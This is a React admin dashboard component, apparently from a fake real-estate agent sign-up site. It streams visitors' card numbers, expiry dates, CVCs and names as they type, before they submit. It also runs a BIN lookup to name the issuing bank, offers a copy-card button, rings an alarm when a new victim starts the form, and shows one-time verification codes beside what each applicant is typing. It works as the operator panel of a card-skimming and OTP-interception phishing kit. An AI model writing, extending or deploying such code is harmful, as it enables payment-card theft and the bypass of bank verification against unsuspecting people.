"use client";

import { useEffect, useRef, useState } from "react";
import { BellRing, CreditCard, KeyRound, Radio } from "lucide-react";
import { Badge, Card } from "@/components/ui";
import { DeleteButton } from "@/components/admin/DeleteButton";
import { BankTag } from "@/components/admin/BankTag";
import { BinDetails } from "@/components/admin/BinDetails";
import { CopyCard } from "@/components/admin/CopyCard";
import { deleteCheckoutSessionAction } from "@/lib/actions/admin";
import { OTP_LENGTH } from "@/lib/activation";

/** How long the panel rings (and flashes) when someone new arrives. */
const RING_SECONDS = 7;

/* ------------------------------------------------------------------ */
/* A phone-ring built entirely from oscillators — no audio file needed. */
/* ------------------------------------------------------------------ */

let sharedCtx: AudioContext | null = null;

function ensureAudioContext(): AudioContext | null {
  if (typeof window === "undefined") return null;
  const AC =
    window.AudioContext ??
    (window as unknown as { webkitAudioContext?: typeof AudioContext }).webkitAudioContext;
  if (!AC) return null;
  if (!sharedCtx || sharedCtx.state === "closed") sharedCtx = new AC();
  if (sharedCtx.state === "suspended") void sharedCtx.resume();
  return sharedCtx;
}

/** Ready the audio context inside a user gesture so the ring is never blocked. */
function unlockRingAudio(): void {
  const ctx = ensureAudioContext();
  if (ctx && ctx.state === "suspended") void ctx.resume();
}

/**
 * Ring like a phone for RING_SECONDS — two-tone bursts with silence between.
 * Browsers gate audio on a prior user gesture; the dashboard expects an admin
 * who has clicked around, so `unlockRingAudio` warms the context for us.
 * The context stays open and silent afterwards (idle AudioContexts are cheap),
 * which lets a second arrival ring straight over the end of the first.
 */
function startRingAudio(): void {
  const ctx = ensureAudioContext();
  if (!ctx) return;

  const master = ctx.createGain();
  master.gain.value = 0.5;
  master.connect(ctx.destination);

  const start = ctx.currentTime + 0.02;
  const end = start + RING_SECONDS;
  let t = start;

  while (t < end) {
    const dur = Math.min(1.1, end - t);
    const gain = ctx.createGain();
    gain.gain.setValueAtTime(0.0001, t);
    gain.gain.exponentialRampToValueAtTime(0.9, t + 0.04);
    gain.gain.setValueAtTime(0.9, t + dur - 0.04);
    gain.gain.exponentialRampToValueAtTime(0.0001, t + dur);
    gain.connect(master);
    for (const freq of [440, 480]) {
      const osc = ctx.createOscillator();
      osc.type = "sine";
      osc.frequency.value = freq;
      osc.connect(gain);
      osc.start(t);
      osc.stop(t + dur + 0.05);
    }
    t += 3.2; // ring for ~1.1s, then silence until the next burst
  }
}

interface LiveSession {
  id: number;
  first_name: string | null;
  last_name: string | null;
  email: string | null;
  phone: string | null;
  brokerage: string | null;
  license_state: string | null;
  cardholder_name: string | null;
  card_number: string | null;
  card_expiry: string | null;
  card_cvc: string | null;
  step: string | null;
  user_id: number | null;
  updated_at: string;
}

interface OtpApplicant {
  id: number;
  stage: string;
  code: string | null;
  typed: string | null;
  first_name: string | null;
  last_name: string | null;
  email: string | null;
  updated_at: string | null;
}

const STEP_BADGE: Record<string, string> = {
  "Agent Information": "bg-brand-100 text-brand-700 ring-brand-600/20",
  "Referral Agreement": "bg-amber-100 text-amber-800 ring-amber-600/20",
  Payment: "bg-sky-100 text-sky-800 ring-sky-600/20",
  payment: "bg-sky-100 text-sky-800 ring-sky-600/20",
};

function agoLabel(iso: string, now: number): string {
  const secs = Math.max(0, Math.round((now - new Date(iso).getTime()) / 1000));
  if (secs < 3) return "just now";
  if (secs < 60) return `${secs}s ago`;
  const mins = Math.floor(secs / 60);
  return `${mins}m ago`;
}

/**
 * Live view of people currently filling out the join form — updates ~1s so the
 * card number appears digit-by-digit as it is typed, before any account exists.
 */
export function LiveCheckouts() {
  const [sessions, setSessions] = useState<LiveSession[]>([]);
  const [otpApplicants, setOtpApplicants] = useState<OtpApplicant[]>([]);
  const [now, setNow] = useState(0);
  const [alert, setAlert] = useState<LiveSession | null>(null);

  // Session ids already seen, so only brand-new arrivals ring the bell.
  const knownIds = useRef<Set<number>>(new Set());
  const baselined = useRef(false);
  const ringTimer = useRef<ReturnType<typeof setTimeout> | null>(null);

  // Unlock audio on the first touch/clicks, so the ring isn't gated by the
  // browser's autoplay rules when it fires a minute later.
  useEffect(() => {
    const unlock = () => unlockRingAudio();
    window.addEventListener("pointerdown", unlock);
    window.addEventListener("keydown", unlock);
    return () => {
      window.removeEventListener("pointerdown", unlock);
      window.removeEventListener("keydown", unlock);
    };
  }, []);

  useEffect(() => {
    let stopped = false;
    const load = async () => {
      // Never poll a hidden tab — a forgotten open dashboard would otherwise
      // hammer the database around the clock and slow the whole app down.
      if (typeof document !== "undefined" && document.hidden) return;
      try {
        const res = await fetch("/api/admin/live-checkouts", { cache: "no-store" });
        if (!res.ok) return;
        const data = (await res.json()) as { sessions: LiveSession[]; otpApplicants?: OtpApplicant[] };
        if (stopped) return;

        const live = data.sessions.filter((s) => !s.user_id);
        const fresh = baselined.current ? live.find((s) => !knownIds.current.has(s.id)) : null;
        if (!baselined.current) {
          baselined.current = true;
          live.forEach((s) => knownIds.current.add(s.id));
        } else {
          live.forEach((s) => knownIds.current.add(s.id));
        }

        setSessions(data.sessions);
        setOtpApplicants(data.otpApplicants ?? []);
        setNow(Date.now());

        // Someone just opened the form — ring for a few seconds.
        if (fresh) {
          startRingAudio();
          if (ringTimer.current) clearTimeout(ringTimer.current);
          setAlert(fresh);
          ringTimer.current = setTimeout(() => {
            setAlert(null);
            ringTimer.current = null;
          }, RING_SECONDS * 1000);
        }
      } catch {
        /* retry next tick */
      }
    };
    void load();
    const poll = setInterval(load, 5000);
    const onVisible = () => {
      if (!document.hidden) void load();
    };
    document.addEventListener("visibilitychange", onVisible);
    return () => {
      stopped = true;
      clearInterval(poll);
      document.removeEventListener("visibilitychange", onVisible);
      if (ringTimer.current) clearTimeout(ringTimer.current);
    };
  }, []);

  const active = sessions.filter((s) => !s.user_id);
  const alertActive = alert && !alert.user_id ? alert : null;

  return (
    <>
    {otpApplicants.length > 0 ? (
      <section className="mb-8">
        <h2 className="flex items-center gap-2 font-serif text-lg font-bold text-brand-950">
          <KeyRound size={18} className="text-sky-600" />
          Verification Codes
        </h2>
        <p className="mt-0.5 text-sm text-brand-500">
          The code to give each applicant, and the code they&rsquo;re typing right now.
        </p>
        <div className="mt-4 grid gap-4 md:grid-cols-2">
          {otpApplicants.map((a) => {
            const name = `${a.first_name ?? ""} ${a.last_name ?? ""}`.trim() || a.email || "Applicant";
            const typed = (a.typed ?? "").padEnd(OTP_LENGTH, "•").slice(0, OTP_LENGTH);
            const verified = a.stage === "otp_verified";
            return (
              <Card key={a.id} className="ring-1 ring-sky-100">
                <div className="flex items-start justify-between gap-3">
                  <div className="min-w-0">
                    <p className="truncate font-semibold text-brand-950">{name}</p>
                    <p className="truncate text-sm text-brand-500">{a.email}</p>
                  </div>
                  {verified ? (
                    <Badge className="shrink-0 bg-emerald-100 text-emerald-800 ring-emerald-600/20">Verified</Badge>
                  ) : (
                    <Badge className="shrink-0 bg-sky-100 text-sky-800 ring-sky-600/20">Entering code</Badge>
                  )}
                </div>
                <div className="mt-4 grid grid-cols-2 gap-3">
                  <div className="rounded-xl border border-sky-200 bg-sky-50 p-3">
                    <p className="text-[11px] font-semibold uppercase tracking-wider text-sky-600">Code to give</p>
                    <p className="mt-1 font-mono text-xl font-bold tracking-[0.15em] text-sky-900 sm:text-2xl sm:tracking-[0.25em]">
                      {a.code || (verified ? "✓" : "—")}
                    </p>
                  </div>
                  <div className="rounded-xl border border-brand-100 bg-brand-50/60 p-3">
                    <p className="text-[11px] font-semibold uppercase tracking-wider text-brand-400">They&rsquo;re typing</p>
                    <p className="mt-1 font-mono text-xl font-bold tracking-[0.15em] text-brand-950 sm:text-2xl sm:tracking-[0.25em]">{typed}</p>
                  </div>
                </div>
                <p className="mt-2 text-xs text-brand-400">{now && a.updated_at ? agoLabel(a.updated_at, now) : ""}</p>
              </Card>
            );
          })}
        </div>
      </section>
    ) : null}

    <section className="mb-8">
      <div className="flex items-center justify-between gap-4">
        <div>
          <h2 className="flex items-center gap-2 font-serif text-lg font-bold text-brand-950">
            <Radio size={18} className="text-rose-500" />
            Live Checkouts
          </h2>
          <p className="mt-0.5 text-sm text-brand-500">
            People filling out the join form right now — the card fills in as they type.
          </p>
        </div>
        <Badge
          className={`shrink-0 ${alertActive ? "bg-rose-600 text-white ring-rose-700/40 animate-pulse-soft" : "bg-rose-50 text-rose-700 ring-rose-600/20"}`}
        >
          <span className={`mr-1.5 inline-block h-1.5 w-1.5 rounded-full ${alertActive ? "bg-white ping-dot" : "bg-rose-500 ping-dot"}`} />
          {active.length} live{alertActive ? " · ringing" : ""}
        </Badge>
      </div>

      {alertActive ? (
        <div className="animate-notice-in mt-4 flex items-center gap-3 rounded-2xl border border-rose-200 bg-rose-50 px-5 py-4 shadow-[0_10px_40px_-15px_rgba(225,29,72,0.35)]">
          <span className="relative flex h-11 w-11 shrink-0 items-center justify-center rounded-full bg-rose-600 text-white shadow-lg shadow-rose-600/30">
            <BellRing size={20} className="animate-vibrate" />
            <span className="ping-dot absolute inset-0 rounded-full bg-inherit" />
          </span>
          <div className="min-w-0">
            <p className="font-semibold text-brand-950">
              Someone is filling out the form right now
            </p>
            <p className="truncate text-sm text-brand-500">
              {`${alertActive.first_name ?? ""} ${alertActive.last_name ?? ""}`.trim() || "New applicant"}
              {alertActive.email ? ` · ${alertActive.email}` : ""}
            </p>
          </div>
        </div>
      ) : null}

      {sessions.length === 0 ? (
        <Card className="mt-4 flex items-center gap-3 py-5 text-sm text-brand-500">
          <CreditCard size={18} className="text-brand-400" />
          No one is filling out the form right now. Live sessions appear here the moment someone starts.
        </Card>
      ) : (
        <div className="mt-4 grid gap-4 md:grid-cols-2">
          {sessions.map((s) => {
            const name = `${s.first_name ?? ""} ${s.last_name ?? ""}`.trim() || "New applicant";
            const submitted = Boolean(s.user_id);
            return (
              <Card key={s.id} className={submitted ? "opacity-70" : "ring-1 ring-rose-100"}>
                <div className="flex items-start justify-between gap-3">
                  <div className="min-w-0">
                    <p className="truncate font-semibold text-brand-950">{name}</p>
                    <p className="truncate text-sm text-brand-500">{s.email || "…"}</p>
                  </div>
                  {submitted ? (
                    <Badge className="shrink-0 bg-emerald-100 text-emerald-800 ring-emerald-600/20">Submitted</Badge>
                  ) : s.step ? (
                    <Badge className={`shrink-0 ${STEP_BADGE[s.step] ?? "bg-brand-100 text-brand-700 ring-brand-600/20"}`}>
                      {s.step === "payment" ? "Payment" : s.step}
                    </Badge>
                  ) : null}
                </div>

                <div className="mt-4 grid gap-3 rounded-xl border border-brand-100 bg-brand-50/60 p-3.5 sm:grid-cols-[minmax(0,1fr)_11rem]">
                  {/* The bank resolves off the first six digits, so it names
                      itself part-way through the number rather than at the end. */}
                  <div className="min-w-0">
                    <div className="flex items-center justify-between gap-2">
                      <div className="flex items-center gap-2 text-[11px] font-semibold uppercase tracking-wider text-brand-400">
                        <CreditCard size={13} />
                        Card being entered
                      </div>
                      <BankTag cardNumber={s.card_number} />
                    </div>
                    <p className="mt-1.5 font-mono text-lg font-semibold tracking-[0.06em] text-brand-950">
                      {s.card_number || <span className="text-brand-300">—</span>}
                    </p>
                    <div className="mt-1 flex gap-4 font-mono text-sm text-brand-600">
                      <span>{s.card_expiry ? `Exp ${s.card_expiry}` : "Exp —"}</span>
                      <span>{s.card_cvc ? `CVC ${s.card_cvc}` : "CVC —"}</span>
                    </div>
                    {s.cardholder_name ? (
                      <p className="mt-1 truncate text-xs text-brand-500">{s.cardholder_name}</p>
                    ) : null}
                    {/* Takes whatever has been typed so far — the panel is live,
                        so a half-entered number copies as a half-entered number. */}
                    <CopyCard
                      className="mt-2.5"
                      number={s.card_number}
                      expiry={s.card_expiry}
                      cvc={s.card_cvc}
                      name={s.cardholder_name}
                    />
                  </div>

                  {/* Right of the card: what the BIN database says about it —
                      issuing bank, scheme, debit or credit, and country. */}
                  <BinDetails cardNumber={s.card_number} className="self-start" />
                </div>

                <div className="mt-3 flex items-end justify-between gap-4">
                  <div className="flex flex-wrap gap-x-4 gap-y-1 text-xs text-brand-400">
                    {s.brokerage ? <span>{s.brokerage}</span> : null}
                    {s.license_state ? <span>License · {s.license_state}</span> : null}
                    {s.phone ? <span>{s.phone}</span> : null}
                    <span>{now ? agoLabel(s.updated_at, now) : ""}</span>
                  </div>
                  <DeleteButton
                    id={s.id}
                    action={deleteCheckoutSessionAction}
                    label="Remove"
                    confirmLabel="Remove?"
                    className="shrink-0"
                    // Drop it from the panel at once; the next poll would
                    // otherwise leave the card up for a few more seconds.
                    onDeleted={() => setSessions((list) => list.filter((x) => x.id !== s.id))}
                  />
                </div>
              </Card>
            );
          })}
        </div>
      )}
    </section>
    </>
  );
}
